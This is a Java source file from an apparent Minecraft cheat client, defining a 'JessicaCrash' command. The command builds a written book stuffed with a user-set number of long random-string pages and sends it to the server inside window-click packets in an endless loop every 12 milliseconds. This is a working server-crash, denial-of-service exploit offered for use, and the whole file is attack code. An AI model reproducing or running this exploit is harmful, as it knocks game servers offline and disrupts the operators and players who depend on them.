package hack.rawfish2d.client.cmd;

import java.util.Random;

import hack.rawfish2d.client.Client;
import hack.rawfish2d.client.ModCombat.FastClick;
import hack.rawfish2d.client.cmd.base.Command;
import hack.rawfish2d.client.cmd.base.CommandUtils;
import hack.rawfish2d.client.utils.MiscUtils;
import net.minecraft.src.ItemStack;
import net.minecraft.src.NBTTagCompound;
import net.minecraft.src.NBTTagList;
import net.minecraft.src.NBTTagString;
import net.minecraft.src.Packet102WindowClick;

public class JessicaCrash extends Command {
	public JessicaCrash(String color, String cmd, String desc, String syntax) {
		super(color, cmd, desc, syntax);
	}

	@Override
	public void run(String msg, final String []args) {
		if(args.length == 2) {
			new Thread(){
                @Override
                public void run() {
                    try {
                    	//crash from JessicaClient
                        MiscUtils.sendChatClient("Attack started!");
                        ItemStack bookObj = new ItemStack(386, 1, 0);
                        NBTTagList list = new NBTTagList();
                        NBTTagCompound tag = new NBTTagCompound();
                        String author = Client.getInstance().mc.session.username;
                        String title = "Title";
                        String str = "2QYy1W5KEpQK8469bs2TBkz7xA0UAGP3y4jAL3KNY92IW9j4jJu5t0m73YXC0uux3IO39SuW3eJ302A3TF44403qD617W0P0Q33654AI1felEn0210E6JgEzG219tlGr8S26f37IHE9epS4iFg62Jq7R4Gzjxn5RpBqQOE05M4tCZ7Lpvkp0Lzg8yWAk6pGd5l3b063n8Kj7hB540luLuV335N1PDynw8ZBs87MA3runo5D0RAViBA31EhsE32552PjYKXxs29Mm1sK8412WYFWm0H9JeSOhbIR03i5UZhz9H18vVUF19gW73akj9t8aYYpa068Tpfdhg38IBWkX2K9GqbmbUxFdkgcru3qfJhJ2ilZ04CJeNlkP2K731f0pRfsHol4r3eZYJ6cBuur4XDXsS7IBUungWmE5RcUxf2hOjTosTovfELbu6iOD965l845r4SPyNLSNo4HPLMA2T2Z3L7f009Hu6U01eWiVEGV41EXj51iB79tl322Kt8rN6KWzrxbNr0sF7lyC5qYUkSeq13u1xU2gSRx0EJ8ud4p4UYdXyuk5M748g5c4LVdGx4781r10267ZbxefLipby";
                        //String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                        //String size;
                        //Random rng = new Random();
                        if(System.nanoTime() % 2 == 0)
                        	str = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                        else if(System.nanoTime() % 3 == 0)
                        	str = "2QYoKq7wkitJX26j1jt0lmG2AtUyO5x0pE4Lfq00C6ILhwW30EKx3B0tJo0gvv4LdSoz321M8plN4LaxS6fcjUmDt7MwGBg5iM3C4Ekzl72EGmxcElqRALwNUDEdSLb8HgG9rG8Pz79PjF04GO39fjX62RDZfyHizTAldr1G0KghAhvJ261U11f75P0Oq6PRAm81c2hTlO2Q43ixB878GE52LTEoMiWJZYcO2VuZ9ripGTpvEmzc05hwr83104xDfZ2T76i7j7kpe7q96FA4Th2NeTznHZNY5W452VN6X61qrtxq7Sv8d6qjk8HL23Zm9VZ3iNMkAG0A1qShNK3M6M74iUnN6W7nc551b8ETk3qyoc4O6qxMRPjb9xV961RO97F2B49jE0rtS15GTBe763jKg7dO5x46TYCKo1hoWeK017054uq51gpU21PL1nLJG2r1DWohc6Fr5NumTLYqc264227fvMb0ePXNU271m12QPw61M45Us85DBo5cpYT871Ue4LpKyV11MIzrx4vKypawWagOm3g9PFxvbx7hAWWjk1FgJFi9BKirTOYm8itOV11HBgt5Gy5ZWR0m1qUFE";
                        else if(System.nanoTime() % 5 == 0)
                        	str = "VoRA5oB92u8m7TGj675TPOvVXE18ofP26Y70cOXQX9ByD6bP7hH4Y96q2kb65slAdDQfL1GF1msp3rCnREE2Y2PlPKCwsd5H27SsBVMjMj77KeO15R1X4S890S1A8YVq44NJzi5HUlkQHJaJnhH5El9FD0kW0WfwZW1ID9t16raDqGKum9Kxf4Yah5fOBc3bzv5P0SyZIXG8XZPSj0k82DX8J5rZMC9c79ghq7Z32suMpSc5E1KJEn4TT3LORUE84ILR4F66M0dvcWe8b12Om7chUNOZBsHQf1fOyZPoe20zOl4PN3IsS3UY04nBlHoH22V2cIZbm2bWI32ObfoJ52PQB09FnSqZeVl2eY5rJEp0W5240OwCvu20srPEOFe306utK9xznEQlBGGNBI8tOv0D05eycT72Y26fZnrZj771Zngf3104SD27frWjC7uZ42Wv2aaUussq28LQ5SrmK4EmaoSIjOG25Eo9qqL40SnuNv3G355B4YBnTW93hB3LQhrGx8Y36h7cDsCu7Fg9ZeT28TVmURND2zFOmGKrc7naDMpj0lr37Kz7GCkbe4Gj24FE0M9Yz6ISS4Eo95pZX";
                        else if(System.nanoTime() % 7 == 0)
                        	str = "fuIBss53b7Cc37JIjxn67qxfBAy94taRVo40XWfj26v56sln18s4nZ1Z0xUEO61Xsr8d2f56m3a5OCEMpbo1lTvg0EUvnbX5e9UwvyAUYK78bBIYdqMKLSNK3GkcSYnO9eMcXR5hFrYedevgleh6y7bOuXSeZa62OJM6BZR9McRofl18jPFoND021zMMSf5V2t587jd13SZflUT9V8DPumUz2s77ZZt3D4mt31h7zMG2I80Ov6P0IFlk0OL3Ou7YOk1LXqK0L6EDvC7m5i55OToqp6jYb96m0Jot166rBm6B2dCw67TPZOGTGBs4EVfi2UDs2B066rhtME21EvNXgE1Al2kbG52A9o76x1Stc69RgV4u87r53vqWgB1slGWeHOofj46dEVr4f5qw5kmeaeFl86w9jl94m016b7WyZy2MpAwl63p9c67UXw6z7nv6UhqESqrLqShz185Ywx4a8if05hw33R224kGc34EDe580e2573c4VPC3q2b3mj4U8pd6W2a17h8S01MeI99Zu5hbE22e5wjgn0J2pPHeCewj86YHD3V7m1stoQmqeA6700A57N9F0kJWb505HB9khL";
                        else if(System.nanoTime() % 9 == 0)
                        	str = "VNuLMpmgdaoa8m9DAg225Dkt2Et4GkTRR8Y8Tn6YS945A74U0d7o6uwI1scN338x8ZzsP4SonBJnkmnnuNrH563b4NWL1G3b0gdNCXX3YjoRq2nxw90ac0cE08Y6A8fvjo62juzn14w4J6fvu9dKO6c9yLp65Mt9T34yv39AqGzF4k49oimDu2Fai3UkvW6b7O2361626N409yyIw156GuaB1CIVPQI2N3lRbDbZ5rn7w1yD6wfXr07w82Mw43h25gAPa24W245y5Akye5k8ocKqpNW7R6gc3zqW6KO7lr1ui9YpJWgZbYFYIzB60drsmLd3p95rbCx5lBwo6cUakEf1q36S655uUmGt9m4NufrTQCC30rV6f9ZeMtUN5D9VgfV1vT0K128qWMd3UbutwmcH1558fzC78mQ61OCcf44tLPg6Iq2gWZ86cdWQbY98iqT6dop6Y3rUWZUb1vWTKTUc7c2kLbULwD7433C41ly0Gx056Rg0d9U9vRJtq0o29rrq211bXi58367uC7I0ZWw7K12px8x36a57Yk6qm4HP7lNlBD6BKsMn7zg8kLy3kFx6bld4GX545MlQJ3q2V";
                        else if(System.nanoTime() % 11 == 0)
                        	str = "m79qhT0qeW47mTkF9rHV87k4Jl4pjgltZVpFpvo8047aTlks4L1f62328810Np9OHPj1oPwb4iU34fZrD99i0kbDyLgWCR40CnKRerk87KzXrEp2OGWJDObW0BvYw9VuO0UK0a90Z4an210Bz9m0DFK7v1W81u2m9C8GFAU6yeb1En2Z4Pvw743nPvU1to7hP3223K0lm6TCK46VY3lhhtIqcU0SPyr9gOR5YycAd4ba013Ew8cizMUQZDo1O8v4J2J6wU84S23v3QoH3QYN7s3Niud3u5505Xf6C31Cp29l57JnHDBxogs13LC0rBM2VXu9fFNv18Ix2kf8lZ6403PCnS3AY02b78G02pmCH054tlPuKIOWxQ1zRHRTYweQ088OMLINLE7qnf492uvXRf3Xgz5w3hT97aCqYBGxf2ams1kdZi9yqIn88lNO8A3y2ienCs377krC4q95JtblL3hFv582wVK6BUj1QF1of7poKYH16004exbH8d7QoF56E6UhsUNPa1hwcsT4t5zew82X8wIpc03EHH3tz7UDutP7Q5BmNwE7ZwW8tawd8M3qz4l6rGK5GPLca7GI0hl1v";

                        int i = 0;
                        int imax = Integer.parseInt(args[1]);
                        while (i < imax) {
                            String siteContent = str;
                            NBTTagString tString = new NBTTagString(siteContent);
                            list.appendTag(tString);
                            ++i;
                        }
                        tag.setString("author", author);
                        tag.setString("title", title);
                        tag.setTag("pages", list);
                        bookObj.setTagInfo("pages", list);
                        bookObj.setTagCompound(tag);
                        do {
                        	Client.getInstance().mc.getNetHandler().addToSendQueue(new Packet102WindowClick(0, 0, 0, 0, bookObj, (short)0));
                            //Wrapper.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, 0));
                            Thread.sleep(12L);
                        } while (true);
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                        return;
                    }
                }
            }.start();
		}
	}
}
